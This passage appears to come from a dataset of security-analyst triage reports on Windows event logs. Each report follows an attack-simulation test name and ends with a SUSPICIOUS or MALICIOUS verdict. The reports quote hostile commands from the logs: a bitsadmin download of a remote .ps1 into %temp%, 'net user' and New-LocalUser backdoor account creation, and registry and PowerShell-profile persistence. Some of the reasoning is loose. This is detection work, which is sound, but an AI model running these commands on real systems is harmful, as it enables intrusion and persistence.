     - Modifies the registry to execute `notepad.xll` when Excel is opened.
   - This behavior aligns with tactics often used by malicious actors to establish persistence or execute payloads via application-specific scripts or add-ins.
   
2. **Usage of `wevtutil.exe`:**
   - Several instances of `wevtutil.exe` (Windows Event Utility) being executed are recorded. This utility is commonly used to clear or export event logs, which can be indicative of logs being tampered with to cover tracks.

3. **Multiple EdgeUpdate Executions:**
   - Numerous instances of `MicrosoftEdgeUpdate.exe` are noted with varying command lines and parent processes. While this can be typical for update services, the volume and frequency are worth noting for potential misuse or impersonation by a malicious actor.

#### Potential Indicators of Compromise:

- The PowerShell invocation to modify Excel behavior by adding an add-in and altering registry settings is highly suspicious. This kind of activity can facilitate remote code execution or persistence without user consent.
- Execution of `wevtutil.exe` may be an attempt to manipulate or clear event logs.
- The rapid sequence of `conhost.exe` and `wevtutil.exe` executions under the `admin_test` account could suggest scripted activity beyond normal user interaction.

### Assessment

Based on the logs, there is significant evidence suggesting potentially malicious activity:

- **PowerShell activity** involving registry manipulation and COM object interaction is atypical for standard administrative tasks, especially with no clear administrative intent articulated.
- Continuous use of event viewer manipulation tools like `wevtutil.exe` raises red flags for potential log tampering.

### Resolution

**Resolution: MALICIOUS**

This log analysis reveals patterns of behavior that strongly suggest malicious intent, notably through the PowerShell script's registry manipulation and add-in setup for Excel that could enable unauthorized execution of code:

- Immediate action is recommended to:
  - Isolate the affected host (Server002) and prevent further potential damage or data exfiltration.
  - Conduct a full forensic analysis of the system to understand the scope of the compromise and identify any additional persistence mechanisms.
  - Review and restore affected registry settings and verify the integrity of Office applications.
  - Investigate the source of the PowerShell script and the specific intent of the executed commands.
- Educate users on secure PowerShell practices and reinforce security monitoring around PowerShell and event log utilities."
Create a new account similar to ANONYMOUS LOGON,"### Detailed Analysis of Logs

Upon reviewing the series of logs provided, there are several points worth highlighting:

1. **Normal System Activity**:
   - Logs indicate processes such as `svchost.exe`, `wuauclt.exe`, `MpCmdRun.exe`, `HOSTNAME.EXE`, `conhost.exe`, and `whoami.exe` running under ""NT AUTHORITY\SYSTEM"". These processes are commonly used by the system and, on their own, do not suggest malicious behavior.
   - The events involving `MpSigStub.exe`, `AM_Delta.exe`, and other Windows Defender processes are consistent with a Windows Defender update/maintenance cycle. This is supported by a System log indicating a ""Security Intelligence Update for Microsoft Defender Antivirus"".

2. **Suspicious Activity**:
   - The use of `wevtutil.exe`, which is a command-line utility used to manage Windows event logs, could potentially be leveraged for clearing logs to cover tracks. This was executed multiple times by ""SERVER002\admin_test"", which could indicate either maintenance activities or potential misuse.
   - `whoami.exe` executions also appear associated with ""SERVER002\admin_test"", which could be interpreted as an attempt to gather user context information. Again, this could be routine administrative checks or preparatory steps in malicious activity.

3. **Malicious Activity**:
   - A `cmd.exe` event shows an attempt to create a new user account with the command `""cmd.exe"" /c net user ""ANONYMOUS LOGON"" ""data_pass123!"" /add /domain""`, which is a direct indication of unauthorized user creation. This action is highly indicative of compromise since it suggests the possibility of setting up a backdoor or creating an account for illicit use.
   - The presence of `net.exe` and `net1.exe` for executing user account-related commands further corroborates this finding as an unauthorized activity, especially considering the choice of username ""ANONYMOUS LOGON"", which is unconventional.

### Assessment and Resolution

**Assessment**:
The sequence of events and operations performed by ""SERVER002\admin_test"" is unusual and includes clear signs of potential malicious activity, most notably the creation of a new user account using the `net user` command. The repetitive instantiation of `wevtutil.exe` for handling event logs could suggest attempts to obfuscate these actions.

**Resolution**: 
- **MALICIOUS** - The logs contain evidence of unauthorized user account creation coupled with potential log manipulation activities, strongly indicating malicious intent and possible system compromise.

### Guidance on How to Proceed

1. **Immediate Actions**:
   - Isolate the affected machine, `Server002`, from the network to prevent further unauthorized access.
   - Reset credentials and review all active directory entries, focusing on removing suspicious accounts, notably ""ANONYMOUS LOGON"".
   - Check file integrity and configurations, particularly for audit and security settings.

2. **Investigation and Remediation**:
   - Conduct a thorough investigation into how ""admin_test"" accessed these capabilities and assess all recent access logs linked to this user.
   - Review installed software and look for unauthorized or suspicious entries.
   - Evaluate system logs for any missed indicators or anomalies in other processes.

3. **Long-term Security Measures**:
   - Enhance logging and event management alerts for similar user account creation attempts.
   - Conduct security training for system administrators to recognize and prevent similar incidents.
   - Apply or review access control policies to ensure the principle of least privilege is rigorously enforced."
Install MS Exchange Transport Agent Persistence,"Let's conduct a detailed analysis of the provided Windows event logs to evaluate any potential indicators of malicious activity. 

### Key Observations:

1. **Security Log:**
   - **EventID 4634, 4672, and 4624:** These refer to logoff, special privilege assignments, and successful logon, respectively. A user named `admin_test` is associated with these events. The use of NTLM for authentication (`LogonType=3`) could be legitimate remote desktop sessions, but when combined with the privileges (`SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, etc.`) assigned to the session, they suggest a potential risk if unsanctioned.

2. **PowerShell Log:**
   - There are several events indicating the execution of PowerShell commands related to the installation of a Transport Agent in an Exchange environment (notably using `Install-TransportAgent` and `Enable-TransportAgent`). This could be legitimate administrative activity if performed by an authorized IT admin but could be abused for persistence or data exfiltration if unauthorized.

3. **Sysmon Log:**
   - A notable observation is the presence of `wevtutil.exe` and `wevtutil.exe` spanning across multiple entries. This utility can be used to query and manipulate event logs and might indicate efforts to clear or tamper with logs.
   - The usage of tools like `whoami.exe` and `hostname.exe` could indicate reconnaissance, typically a precursor in lateral movement.
   - Processes running with high privileges and examples of PowerShell activities could reflect suspicious behavior if not part of standard operations.

4. **Additional Entries:**
   - Edge update and installation events logged by Sysmon seem typical, suggesting routine software maintenance.
   - The `MicrosoftEdgeUpdate.exe` executing within `NT AUTHORITY\SYSTEM` context aligns with standard update processes if properly scheduled.

### Assessment:

The activities related to the `admin_test` user, notably the combination of high privileges, NTLM authentication, utility executions like `wevtutil.exe`, and PowerShell command execution, provide slightly elevated indicators that could suggest malicious activity, especially if these activities occur outside the schedule or lack documentation of authorized tasks or changes.

### Conclusion:

The findings fall under the resolution **SUSPICIOUS**. This assessment is grounded in potentially benign administrative actions that can be misused. Further investigation is warranted to confirm the legitimacy of the user session and the PowerShell scripts' intent.

### Suggested Actions:

1. **Verify the legitimacy of the `admin_test` session**: Confirm this account's purpose and if the associated activities were authorized.
2. **Examine the Event Logs**: Look for anomalies or signs of tampering around the timestamps observed for `wevtutil.exe`.
3. **Review PowerShell Scripts**: Ensure PowerShell activities align with company policies or planned administrative tasks.
4. **Conduct User Behavior Analysis**: Investigate if similar activities were logged historically, and verify against user expectations.

Taking these steps can help determine if there is a legitimate explanation for this activity or if further security measures are warranted."
"Persist, Download, & Execute","### Analysis of Windows Event Logs

#### Suspicious or Anomalous Behavior:

1. **Usage of `bitsadmin.exe`:**
   - The logs display multiple invocations of `bitsadmin.exe` with various command line arguments. This behavior is suspicious as `bitsadmin.exe` is often used by malicious actors for downloading or uploading data due to its ability to transfer files quietly over HTTP/S protocols.
   - Command line of particular interest:
     - `bitsadmin.exe /create fileBITS`
     - `bitsadmin.exe /addfile fileBITS https://raw.githubusercontent.com/file/file-file/master/files/data/data.md %%temp%%\\bitsadmin3_flag.ps1`
     - This indicates an attempt to download a file from a remote source (`raw.githubusercontent.com`) to a local temporary path, which could be indicative of malicious file download or payload delivery.
   - The subsequent use of `bitsadmin.exe /setnotifycmdline` to trigger `notepad.exe` suggests an attempt to execute something post-download, albeit in this instance, it uses `notepad.exe`, which could be a benign placeholder or an attempt to masquerade a benign process as part of the execution chain.

2. **Highly Privileged User Operations:**
   - The user `SERVER002\\admin_test` is seen executing these commands with elevated privileges. The `Security log` indicates that this account was granted a range of privileges usually associated with administrative operations (`SeDebugPrivilege, SeBackupPrivilege, SeRestorePrivilege`, etc.). Such a high level of privilege could allow an attacker to perform unauthorized activities without restrictions.

3. **Time Manipulation:**
   - Logs in the `Security` channel indicate attempts to manipulate the system time (`EventID 4616`). This can be a tactic employed to mislead or avoid detection in log timelines.

4. **Normal Operations:**
   - Microsoft Edge Update: Various entries related to the update processes of Microsoft Edge Update were found, which appear routine and not suspicious within the context of these logs.

#### Assessment:

The presence of `bitsadmin.exe` being used to pull files from a remote location coupled with the privilege level of the executing user (`admin_test`) indicates potential malicious activity. The nature of this command-line activity aligns closely with known attack vectors exploiting `bitsadmin.exe` as a mechanism for data transfer, especially when unencrypted HTTP/S endpoints are used.

Given these findings and the pattern of `bitsadmin.exe` use, the logs suggest a potential breach segment focusing on downloading possibly malicious files and an attempt to evade detection by manipulating system logs and time.

### Resolution: MALICIOUS

#### Recommended Actions:

1. **Immediate Investigation:**
   - Investigate all network activity associated with `SERVER002\\admin_test`, particularly outgoing connections that might have communicated with suspicious external IPs or domains.
   - Isolate and analyze the file `bitsadmin3_flag.ps1` and associated scripts that may have been executed.

2. **Access Review:**
   - Ensure the integrity of the server by reviewing and tightening privileged account access settings, especially for accounts like `admin_test`.

3. **System Time Integrity:**
   - Investigate time synchronization configurations and any unauthorized changes to system time to avoid tampering with timelines.

4. **Containment and Eradication:**
   - Restrict or block `bitsadmin.exe` execution via Group Policy unless explicitly required for business operations.
   - Implement more stringent network egress policies to prevent unauthorized data exfiltration.

5. **Monitoring and Alerts:**
   - Increase monitoring of command-line usage that invokes tools like `bitsadmin.exe` and enforce application whitelisting wherever possible.
   - Set up alerts for repeated failed attempts to manipulate system clocks or exploit other high-privilege operations."
Windows MOFComp.exe Load MOF File,"Upon analysis of the provided Windows event logs, the following observations and conclusions can be drawn:

1. **Suspicious PowerShell Activity**:
   - There is an instance where PowerShell is executing a command that involves the Managed Object Format (MOF) Compiler (`mofcomp.exe`) with a file located in a temporary directory path: `""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.003\\src\\data.003.mof""`. The execution of MOF files can be used maliciously to persistently introduce changes into the Windows Management Instrumentation (WMI) repository, which could be leveraged by an attacker.

2. **Usage of `wevtutil.exe`**:
   - The `wevtutil.exe` process is seen multiple times around the same session. While `wevtutil.exe` is a legitimate utility used to manage event logs on a Windows machine, adversaries sometimes use it to clear event logs, which can be an attempt to cover tracks. However, there are no direct indications within the logs that it was used maliciously, such as explicitly clearing logs.

3. **Frequent Execution of `conhost.exe`**:
   - The `conhost.exe` process is frequently spawned, often associated with command-line applications. Its presence alongside other processes like PowerShell could be expected, but it is important to ensure that these instances align with normal operational patterns.

4. **Normal System Updates and Maintenance**:
   - Multiple log entries involve `MicrosoftEdgeUpdate.exe` and its components. These entries indicate legitimate update processes for Microsoft Edge, which often involve system processes and directories (e.g., `NT AUTHORITY\SYSTEM` user context).

5. **PowerShell Logs Mirroring Sysmon**:
   - PowerShell logs mirror the execution of commands observed in Sysmon, specifically involving the execution of the MOF file. The consistency between logs reinforces the certainty of this activity.

6. **Application Logs Indicate a WMI Event**:
   - An application log entry shows a WMI error involving a query that watches for process creations, specifically targeting `notepad.exe`. This could indicate a misconfiguration, or potentially part of a script or process monitoring setup.

**Assessment**:
The execution of a PowerShell script that involves compiling a MOF file from a temporary directory is highly indicative of potentially malicious activity, given that MOF files can change system configurations or introduce persistence mechanisms. This activity could either involve legitimate administrative scripting or unauthorized changes.

**Recommendation**:
Given the potential risk associated with the PowerShell activity highlighted above:

- **Resolution**: **SUSPICIOUS**

- **Guidance**: 
  - Investigate the context of the MOF file execution. Determine if this was part of scheduled administrative tasks or potentially unauthorized activity. 
  - Ensure that the source of the MOF file and the purpose of its compilation are verified.
  - Review user `SERVER002\admin_test` actions and privileges to establish legitimacy.
  - Consider implementing stricter monitoring and logging around PowerShell script execution and WMI activities.

This suspicious activity warrants further investigation to either confirm authorization or identify a security incident."
Persistent Code Execution Via Word Add-in File (WLL),"**Detailed Analysis of the Logs:**

1. **Windows PowerShell Log Analysis:**
   - The PowerShell script observed in the logs is creating a new Word.Application COM object, checking the Office version (64-bit or 32-bit), and based on that, copying a `.wll` (Word add-in) file to the Word Startup folder. This action is followed by stopping any running instance of ""WinWord"" (Microsoft Word) and then starting a new instance.
   - Such behavior is suspicious because copying files to the Word Startup folder can be a method to persist a malicious Word macro or script. Additionally, automatic starting and stopping of Word can indicate an attempt to manipulate Word settings or intercept user actions.

2. **Sysmon Log Analysis:**
   - The Sysmon logs show multiple instances of `MicrosoftEdgeUpdateComRegisterShell64.exe` executing under the NT AUTHORITY\SYSTEM account, which is typical behavior for a legitimate system update process like Microsoft Edge Update.
   - There is also a series of logs showing execution of PowerShell, which aligns with the activities in the PowerShell logs.
   - Of particular interest are numerous instances of `wevtutil.exe` and `conhost.exe` executed by `SERVER002\admin_test`. `wevtutil.exe` is a legitimate utility for managing Windows event logs, but its frequent use can indicate log tampering or extraction, often seen in clearing traces after malicious activities.

3. **Application Log Analysis:**
   - The application log has entries with the Software Protection Platform Service (SPP) and edgeupdate stopping service, which are benign and expected under normal operations.

**Assessment of the Situation:**
- The contents and execution of the PowerShell script are particularly concerning, as they suggest potential unauthorized changes to Microsoft Word settings through scripting, which can be a vector for further exploitation or persistence.
- The use of `wevtutil.exe` by an administrative user can indicate either system administration tasks or potentially malicious attempts to cover tracks.

**Threats or Risks Identified:**
- **Persistence Mechanism:** The PowerShell script potentially sets up persistence by placing files in the Word Startup directory, which will execute or load every time Word starts.
- **System Manipulation:** The stopping and starting of Word via the script may manipulate Word documents or templates.

**Guidance on How to Proceed:**
- **Further Investigation:** This activity is suspicious and warrants a deeper investigation into the origin and purpose of the executed PowerShell script.
- **Mitigation:** If found malicious, secure endpoints by removing the suspicious `.wll` files from Word's Startup directory, and consider applying endpoint protection policies to restrict script execution.
- **Log Monitoring:** Set up alerts for unusual usage of `wevtutil.exe` and similar tools to identify potential log tampering attempts.

**Resolution:**
- **SUSPICIOUS** - The activity observed is unusual and warrants further investigation to determine whether there is a malicious intent behind the PowerShell script actions and `wevtutil.exe` activity."
Web Shell Written to Disk,"Upon analyzing the provided Windows event logs, several events merit closer examination to determine if there is any indication of malicious activity. Here's a detailed analysis:

1. **Application Log:**
   - **EdgeUpdate and Windows Defender Events:** The logs indicate that the EdgeUpdate service stopped and then resumed, while Windows Defender remained active with the SECURITY_PRODUCT_STATE_ON. This behavior as captured isn't inherently suspicious; EdgeUpdate may need to restart as part of its regular update cycle.
   
2. **Sysmon Log:**
   - **PowerShell Execution:** A process execution event shows PowerShell (`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`) running under the user account `SERVER002\admin_test`. PowerShell activity on its own isn't immediately suspicious unless combined with other signs that may show the script's intent, like encoded commands or execution policies.
   
   - **Cmd.exe and XCOPY Usage:** The logs reveal `cmd.exe` executing with `xcopy`, which is copying files from a temporary user directory to `C:\inetpub\wwwroot`. While this could indicate a benign administrative action, the destination directory (`wwwroot`) being a web server directory raises concern about potential unauthorized uploading or serving of malicious files. 

   - **Wevtutil Executions:** The repeated appearance of `wevtutil.exe`, a utility often used to clear event logs or query information, executed several times without clear context, can be a potential red flag if combined with log cleanup or tampering efforts.
  
   - **Microsoft Edge Update Executions:** Multiple executions of `MicrosoftEdgeUpdate.exe` and related processes are seen in the logs. These executions are typical for an update service but should be checked further if other suspicious actions occur around the same time, such as privilege escalations or external communications.
   
   - **Execution of `whoami.exe` and `hostname.exe`:** These applications are benign at their core, commonly used by administrators to query system information. However, their inclusion in logs without apparent reason could align with activity attempting to gather reconnaissance information by an attacker.

3. **Threats and Risks Identified:** 
   - The specific behavior of copying files to a web server directory using `xcopy` indicates a risk of potential web shell deployment, data exfiltration, or unauthorized web hosting. 
   - Frequent process creation relating to system utilities like PowerShell and command-line instructions (`cmd.exe`, `whoami.exe`, etc.) can suggest attempts to leverage native Windows functionalities for further operations.

**Assessment:** 
- The activities in the logs do not conclusively confirm malicious intent but show several potential indicators of compromise that require further investigation to rule out inappropriate use or unauthorized file uploads to public-facing directories. The repeated usage of command-line utilities in a short timespan without visible IT purposes warrants a more thorough review of the user actions and associated network communications.
  
**Recommendation Going Forward:**
- Conduct a deeper forensic analysis around the logged events, particularly focusing on network activity from `SERVER002`, inspecting inbound and outbound traffic.
- Review any changes or scripts potentially executed through PowerShell and commands run via `cmd.exe`.
- Verify the integrity of `wwwroot` contents and ensure no unauthorized files have been introduced.
- Consider setting up alerting rules for the usage of `wevtutil.exe` and process executions from traditional management tools potentially used in post-exploitation actions.

**Resolution:** SUSPICIOUS - The event logs contain activity that warrants deeper investigation before a definitive conclusion can be reached."
Persistence via WMI Event Subscription - ActiveScriptEventConsumer,"### Detailed Analysis of Logs

**Application Logs:**
1. Multiple entries indicate crashes associated with `Sysmon.exe`.
   - Events with IDs 1000 and 1001 are application crash error reports related to `Sysmon.exe` with a specific fault address (`c0000005`). 
   - These crashes could suggest a problem with `Sysmon` itself, exploits or attempts to terminate monitoring services, which might be indicative of potential tampering or system misconfiguration.

**PowerShell Logs:**
1. Events reveal PowerShell usage with scripts suggesting WMI persistence.
   - The script involves creating an `__EventFilter`, `ActiveScriptEventConsumer`, and `__FilterToConsumerBinding`.
   - These constructs are commonly associated with malicious persistence mechanisms, allowing scripts to execute without direct user intervention, such as launching `notepad.exe` as demonstrated here.

**Sysmon Logs:**
1. Processes like `hostname.exe`, `conhost.exe`, `whoami.exe`, and others are executed under the `admin_test` account.
   - Frequent usage of `whoami.exe` and `whoami` with `conhost.exe` might suggest attempts to discern user privileges or escalate access, though not inherently malicious.
2. Elevated privileges for the `admin_test` account (`High` integrity level) are consistently observed, potentially supporting privilege escalation concerns.

3. A specific concern is the `PowerShell` command line with WMI persistence behavior, matching suspicious activity noted in PowerShell logs.

**Security Logs:**
1. There are Logon events by the user `admin_test` with elevated privileges (`SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc.).
   - These might be legitimate but are suspicious if not typical for this user, especially if these activities align with the timeframe of the suspicious PowerShell activity.
2. Some accesses to `aepic.dll` and `fcon.dll` shown in Event ID 6281, related to code integrity failures, might point towards attempts to exploit or tamper with system DLLs.

### Assessment and Resolution
Based on the log analysis:
- **Sysmon.exe crashes:** Could suggest tampering or an attempt to disrupt logging.
- **PowerShell activity with WMI persistence scripts:** Strong indicator of potential backdoor installation or testing persistence mechanisms.
- **Security logs with elevated privileges and DLL access failures:** Complement the hypothesis of a potential system-level compromise attempt.

**Resolution: MALICIOUS**

### Guidance
1. **Immediate Actions:**
   - Conduct a thorough check on the `Sysmon` configuration and integrity.
   - Audit the `admin_test` account to verify any unauthorized privilege escalation or misuse.
   - Review and investigate configurations/applications triggering the WMI persistence PowerShell scripts.

2. **Remediation Steps:**
   - Patch any vulnerabilities or exploits found; consider updating or reinstating `Sysmon` with a robust configuration.
   - Implement additional surveillance on `PowerShell` executions using enhanced logging and monitoring techniques.
   - Enhance endpoint security measures, particularly on servers with elevated privileges to minimize risk.

3. **Future Recommendations:**
   - Regular audits of account privileges and access logs.
   - Routine analysis of system and application log patterns to detect anomalies.
   - Consider employing threat-hunting teams to identify persistent threats actively."
Persistent Code Execution Via Excel VBA Add-in File (XLAM),"After analyzing the provided collection of Sysmon and PowerShell event logs, the following observations and determinations regarding potential malicious activity were made:

1. **Sysmon Log Analysis:**
   - **Frequent Execution of Utilities and PowerShell**: The logs indicate multiple executions of common Windows utilities like `wbem\\WmiPrvSE.exe`, `PowerShell.exe`, `wevtutil.exe`, `hostname.exe`, `whoami.exe`, and edge update components. Frequent and automated execution without clear scheduled tasks may indicate scripted or automated processes, which can be typical of malicious activities.
   
   - **Suspicious PowerShell Execution**: An especially noteworthy command is executed with PowerShell that involves copying a file (`ExcelVBAaddin.xlam`) from a temporary directory to the startup folder of Microsoft Excel (`XLSTART` directory) and then launching Excel. This behavior is consistent with malware attempting to achieve persistence and execute malicious code when Excel is opened. The use of PowerShell for file copy operations and process initiation raises a red flag for potential misuse in a malicious context. However, the operation resulted in an error, meaning the file was not successfully copied.

2. **Windows PowerShell Log Analysis:**
   - **Warning from Windows PowerShell**: The warning about a failed `CopyItem` operation corroborates the Sysmon logs showing suspicious PowerShell activity. The failure to copy the file indicates an attempted operation that was not completed, possibly indicating an interrupted or incomplete compromise attempt.

3. **Insights and Risk Analysis:**
   - The use of PowerShell to manipulate files in user directories and attempt to execute scripts within a seemingly benign environment (such as an Office application startup folder) is a behavior typically associated with attempts to introduce malicious code or scripts for persistent attacks.
   - The overall elevated level of activity involving administrative accounts (SERVER002\admin_test) and high integrity levels within a short timespan suggests a script or automated task might be executing these commands, which requires deeper investigation into the process responsible for initiating these activities.

### Assessment and Resolution:
- **Resolution**: **SUSPICIOUS**
  - Given the patterns observed in the logs, particularly the failed PowerShell attempt to copy a potentially suspicious file, the activity is suspicious and warrants further investigation.
  - Steps should be taken to:
    - Investigate the source and legitimacy of the `ExcelVBAaddin.xlam` file.
    - Conduct a thorough review of user activities associated with SERVER002\admin_test.
    - Contact IT security to initiate a deeper forensic analysis of `Server002` for potential malware presence or compromised user accounts.
    - Review system integrity and policies regarding the execution of PowerShell scripts on the network.

The review indicates the potential for an initial malicious activity or an attack attempt that was hindered but not entirely prevented, leading to the necessity for a more detailed examination to ensure network security."
Google Chrome Load Unpacked Extension With Command Line,"Upon reviewing the Windows event logs provided, here is the detailed analysis:

1. **Sysmon Logs:**
   - Multiple entries indicate the execution of Windows utilities such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe` by the user `SERVER002\admin_test`. These are common system utilities, but frequent and rapid execution could indicate the use of a script.
   - A particularly suspicious event is the execution of `PowerShell.exe` with a script to download and execute a Chromium snapshot and a browser extension (indicated by process ID 5056). The retrieval and execution of potentially unsigned external code like this, especially from `commondatastorage.googleapis.com` and GitHub, warrants further scrutiny.

2. **System Logs:**
   - The key changes seem to be normal, with updates to the time service and time zone. However, adjustments to system time can be a technique used to evade time-based security controls (e.g., time-based access controls or event timestamp correlation).

3. **Powershell Logs:**
   - The presence of a PowerShell script that downloads files from the internet, unzips them, and launches a Chromium instance with side-loaded extensions is highly suspicious. This behavior is often associated with attempts to exploit vulnerabilities or perform reconnaissance.

4. **Application Logs:**
   - The logs show entries for Edge Update services starting and stopping, which are normal for maintaining browser updates. However, given these coincide with the execution of suspicious PowerShell scripts, they might be indirectly related.

5. **Security Logs:**
   - The absence of security logs is noteworthy and could indicate log tampering or misconfiguration, which is suspicious in and of itself.

**Assessment and Recommendation:**
- The observed behavior, especially the use of PowerShell to download and execute external code, suggests potential malicious activity, particularly aiming at side-loading extensions in a Chromium browser. This could be used to bypass browser security controls or for information gathering.
- The logs do not show definitive evidence of privilege escalation or successful exploitation, but combining rapid process creation with the scripted downloads raises a red flag.
- It is advised to:
    - Review the integrity and actions of `admin_test`.
    - Conduct a thorough forensic analysis, focusing on network traffic analysis and checking for any indicators of compromise related to the downloaded content.
    - Ensure system time-related events are legitimate and not being used for malicious evasion.
    - Check why there are no entries in the security logs and ensure logging configurations are intact, as tampering could indicate an attempt to cover tracks.
    - Consider deploying endpoint detection and response (EDR) solutions for more granular monitoring.

**Resolution:** SUSPICIOUS - Further investigation is needed to confirm if this activity is part of a legitimate administrative task, benign automation, or indeed malicious."
Auto-start application on user logon,"Upon analysis of the provided logs, several entries stand out as potentially malicious activities. Here's a detailed breakdown of findings:

1. **Suspicious Registry Modifications**:
   - In the Sysmon log, specifically EventID 1 with EventRecordID 17980, the command executed via `cmd.exe` is highly suspicious. It involves multiple registry additions under `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test`.
   - The use of command line arguments like `/v TerminateOnDesktopSwitch /t REG_DWORD /d 0 /f` and `/v StartEXE /t REG_SZ /d C:\WINDOWS\system32\cmd.exe /f` mirrors tactics used in persistence mechanisms where the system behavior might be altered to execute certain commands or applications under the guise of accessibility functions or services.
   - This activity is indicative of a potential backdoor or persistence method being established.

2. **Frequent Execution of System Utilities**:
   - There are multiple instances of `cmd.exe`, `conhost.exe`, and `reg.exe` being executed as observed in several Sysmon logs. While it’s not unusual for these processes to run, their combined frequent execution and association with registry modifications in the logs suggest potential scripted automation for tasks that could be related to maintaining an unauthorized presence or making illicit modifications to the system.

3. **Execution of `whoami.exe`**:
   - The execution of `whoami.exe` indicates an attempt to query the currently logged-in user. This often happens when scripts attempt to validate the current session’s permissions. Though benign under normal circumstances, within the context of suspicious command execution, this adds to the risk profile.

Given these findings, the Sysmon log activities associated with EventRecordID 17980 and correlated entries present indicators of suspicious activities, specifically around unauthorized registry modifications designed to maintain persistence.

**Resolution: MALICIOUS**

The investigation suggests that the logs contain indicators of a potential security compromise or unauthorized activities. Immediate steps should include:
- Containment: Isolating the affected host from the network to prevent further unauthorized actions.
- Root Cause Analysis: Further investigation to determine if any other systems are affected and to understand the full extent of the compromise.
- Remediation: Eliminating any malicious scripts or tools and reviewing defensive measures.
- Monitoring: Implement continuous monitoring for similar activities to prevent future occurrences.

It is crucial to act swiftly to remediate and prevent further impact."
Append malicious start-process cmdlet,"Upon analyzing the provided Windows event logs, I have identified some key points that require attention:

**Suspicious Behavior:**

1. **PowerShell Events:**
   - There is a specific PowerShell command seen in multiple PowerShell logs that repeatedly adds contents to a profile and executes `Start-Process calc.exe` followed by an exit command. This activity is logged multiple times. 
   - The command-line arguments in the PowerShell events show ""Add-Content $profile -Value """"Start-Process calc.exe"""", which could suggest the persistence of a script intended to run Calculator on the start of PowerShell sessions, a potential sign of malicious persistence or testing. While execution of `calc.exe` alone may not be harmful, the repeated persistence tactic is suspicious.

2. **Security and Sysmon Events:**
   - There is no strong evidence of privilege escalation or an unauthorized user gaining access or elevated privileges.
   - Multiple legitimate system processes like Microsoft Edge Update components are running as expected in the Sysmon logs, indicating normal application update check behavior.

3. **Credential Access Attempt:**
   - The repeated occurrences of Event ID 5379 across the Security log indicate attempts to read credential information from MicrosoftAccount. All these attempts result in an error code (ReturnCode: 3221226021), which suggests an unauthorized failed attempt to access credential material.

**Benign Observations:**
- Edge updates and general Sysmon events carry out regular system maintenance and updates as expected from the system logs. The log events from processes such as `svchost.exe`, `tmprxe`, and others show routine operations.
- The presence of services such as `CompatTelRunner`, `RUXIMICS`, `UsoClient`, and `wermgr.exe` are common for telemetry and service tasks on Windows systems, representing standard activities.

**Conclusion and Recommendations:**

Given the analysis above, the logs do not provide conclusive evidence of malicious activity but do contain activities that raise suspicions due to potential persistence via PowerShell. This PowerShell activity, coupled with repeated failed credential attempts, suggests further investigation is warranted to ensure no malicious activities are present or in preparation.

**Resolution:** **SUSPICIOUS**

**Guidance for Further Action:**
1. **PowerShell Verification**: Investigate the `$profile` modification script further to understand its origins and intent. Review system PowerShell profiles for unauthorized entries.
2. **Credential Access Analysis**: Ensure the failed credential access attempts are verified to avoid future unauthorized activities. Review any associated accounts for unauthorized access or anomalies.
3. **User and System Audit**: Conduct a security audit on user accounts and the integrity of the system files to ensure no backdoors or persistent threats exist.

Enhanced monitoring of the system for any additional unexpected activities can ensure prompt detection of any transition from suspicious to malicious stages.
"
Create a new user in PowerShell,"After analyzing the provided logs, here's a detailed breakdown:

### Suspicious Activity:
1. **PowerShell Activities**: The PowerShell events indicate the execution of a command to create a new local user named `data.001_PowerShell` without a password:
   - `New-LocalUser -Name \""data.001_PowerShell\"" -NoPassword`
   - This is highly suspicious as it involves creating a user without a password, which is a classic indicator of unauthorized system access or privilege escalation attempts.

2. **Security Log Events**:
   - **Event ID 4720**: Indicates a new user account was created:
     - User `data.001_PowerShell` was created.
   - **Event ID 4722**: Indicates the user `data.001_PowerShell` was enabled.
   - **Event ID 4728**: A user was added to a group, which could imply privilege escalation or modification of group memberships for further access.
   - **Event ID 4738**: User properties for `data.001_PowerShell` were modified, suggesting potential tampering with user settings post-creation.

3. **Sysmon and System Logs**:
   - The logs show entries for commonly used administrative utilities (e.g., `whoami.exe`, `hostname.exe`) and service update processes that seem legitimate in isolation but are potentially part of a broader effort to gather system information while remaining undetected.

### Indicators of Malicious Activity:
- The combination of using PowerShell for unauthorized user creation without a password and the subsequent enabling and potential group membership changes aligns with common tactics used in malicious activities.
- The rapid succession of events and creation of an account with administrative capabilities strongly suggests a compromise or at least a significant security breach attempt.

### Assessment:
- **MALICIOUS**: The activities described, especially the creation and enabling of a user account without a password via PowerShell, indicate unauthorized and potentially harmful actions on the system. These actions align with those of a malicious entity attempting to gain and maintain access to the system.

### Guidance:
1. **Immediate Action**:
   - Disable and remove the user account `data.001_PowerShell`.
   - Investigate and terminate any unnecessary or suspect PowerShell sessions.
   - Check for any unauthorized changes to user privileges or group memberships.

2. **Further Investigation**:
   - Conduct a comprehensive audit of user actions and corresponding logs to track any further unauthorized access attempts.
   - Review and tighten PowerShell usage policies and logging for better detection and response in the future.
   - Scan the system for malware and signs of further compromise, including persistence mechanisms.

3. **Preventive Measures**:
   - Implement stricter user account creation and modification processes, requiring approvals and stronger authentication.
   - Strengthen endpoint protection and deploy enhanced monitoring tools to detect similar activities quickly in the future.

By taking these steps, you can help mitigate the outlined threat and prevent future incidents of a similar nature."
Bitsadmin Download (cmd),"Upon reviewing the provided logs, several events have drawn attention due to their potential indication of suspicious behavior that requires further investigation.

### Detailed Analysis:

1. **Sysmon Logs**:
   - There are multiple instances where processes like `cmd.exe`, `conhost.exe`, and `bitsadmin.exe` were executed with potentially anomalous command-line arguments. Specifically, the command:
     ```
     ""cmd.exe"" /c bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/file/file-file/master/files/data/data.md %%temp%%\\bitsadmin1_flag.ps1
     ```
     This command indicates attempts to download a file using `bitsadmin.exe`, which could suggest an unauthorized data retrieval operation or a means to introduce malicious scripts onto the system.

2. **Process Execution**:
   - The usage of `BITSAdmin` to download files can be an indicator of malicious activity, particularly as it stands out among normal user activity. This tool is often leveraged by attackers for persistent data transfers due to its background capabilities.
   - The execution of `whoami.exe` in this context suggests an escalation or validation of privileges by whatever user or script that initiated the download.

3. **User Context and Accounts**:
   - The logs show actions being performed under the `admin_test` account with high integrity levels, indicating administrative privileges, which can be indicative of a compromised account being used to perform administrative tasks, potentially to cover tracks or execute unauthorized commands.

